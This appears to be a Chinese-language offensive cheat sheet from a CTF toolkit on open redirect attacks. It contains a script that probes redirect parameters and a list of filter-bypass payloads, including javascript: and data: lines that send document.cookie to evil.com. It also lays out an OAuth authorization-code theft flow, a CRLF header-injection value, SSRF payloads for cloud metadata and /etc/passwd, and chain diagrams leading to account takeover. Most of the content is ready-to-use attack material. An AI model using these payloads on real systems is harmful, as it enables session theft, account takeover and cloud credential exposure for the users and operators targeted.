# Open Redirect & Redirect Chain Attacks

## 1. 重定向参数字典

```python
# 常见 redirect 参数名
REDIRECT_PARAMS = [
    "redirect", "redirect_uri", "redirect_url", "url", "next",
    "return", "returnTo", "returnUrl", "goto", "continue",
    "target", "dest", "destination", "redir", "origin",
    "callback", "cb", "fallback", "back", "referrer",
    "forward", "ru", "retUrl", "rUrl", "from", "source",
]

# 探测脚本
import requests
for param in REDIRECT_PARAMS:
    r = requests.get(f"https://target.com/login?{param}=https://evil.com")
    if "evil.com" in r.headers.get("Location", ""):
        print(f"[!] {param} → open redirect")
```

## 2. 重定向绕过 WAF/过滤器

```python
BYPASSES = [
    # 协议相对
    "//evil.com",
    # 反斜杠
    "\\\\evil.com",
    # 多斜杠 → 某些解析器退化为协议相对
    "///evil.com",
    "////evil.com",
    # Unicode 同形字 (е = Cyrillic e)
    "https://еvil.com",
    # URL 编码
    "https://evil.com",  # 审查时解码 → evil.com / 未解码 → 放行
    "https://evil%2ecom",
    # @ 符号混淆 → 前面似合法域名
    "https://target.com@evil.com",
    "https://target.com.evil.com",  # 子域名
    # 路径混淆
    "https://evil.com%23.target.com",
    "https://evil.com%3F.target.com",
    # 302 链: 先跳到白名单域名再跳走
    "https://legit.com/redirect?url=https://evil.com",
    # javascript: (如被用作 a href)
    "javascript:fetch('https://evil.com/'+document.cookie)",
    # data:
    "data:text/html,<script>location='https://evil.com/'+document.cookie</script>",
]
```

## 3. OAuth Redirect → 授权码窃取

```python
# 完整攻击流程:
# 1. 受害者点击: https://target.com/oauth/authorize?client_id=xxx&redirect_uri=https://legit.com%2523%40evil.com&response_type=code
# 2. OAuth 服务器校验 redirect_uri:
#    - 解码一次: https://legit.com%23@evil.com → 域名是 legit.com? → 可能通过
#    - 实际浏览器解析: https://legit.com%23@evil.com → 发送到 evil.com
# 3. 授权码被发到 evil.com
# 4. 攻击者用授权码换 access_token → Account Takeover
```

## 4. Redirect → XSS

```javascript
// 如果 redirect 参数渲染在 <meta> refresh 或 JS 中:
// <meta http-equiv="refresh" content="0;url={redirect}">
// 注入: javascript:alert(document.cookie) → XSS

// 或者在服务端拼接:
// header("Location: " + $_GET['redirect']);
// 注入: %0d%0aSet-Cookie:session=attacker → Header Injection
```

## 5. Redirect → SSRF

```python
# 如果 redirect 的目标被服务端 HTTP 客户端跟随:
# redirect=http://169.254.169.254/latest/meta-data/
# → SSRF 读云 metadata

# redirect=file:///etc/passwd
# → 文件读取 (Java/某些语言)
```

## 6. 攻击链

```
Open Redirect → OAuth code 窃取 → Account Takeover
Open Redirect → Meta refresh XSS → Cookie 窃取
Open Redirect → SSRF → Cloud Metadata
Open Redirect chaining: A→B→C→attacker (跳过白名单)
```

## 工具引用

```bash
# 项目内 HTTP 探测
python scripts/ctf-website/http_probe.py

# 安装第三方 (katana, waybackurls 等)
powershell scripts/ctf-website/install_missing_tools.ps1
```
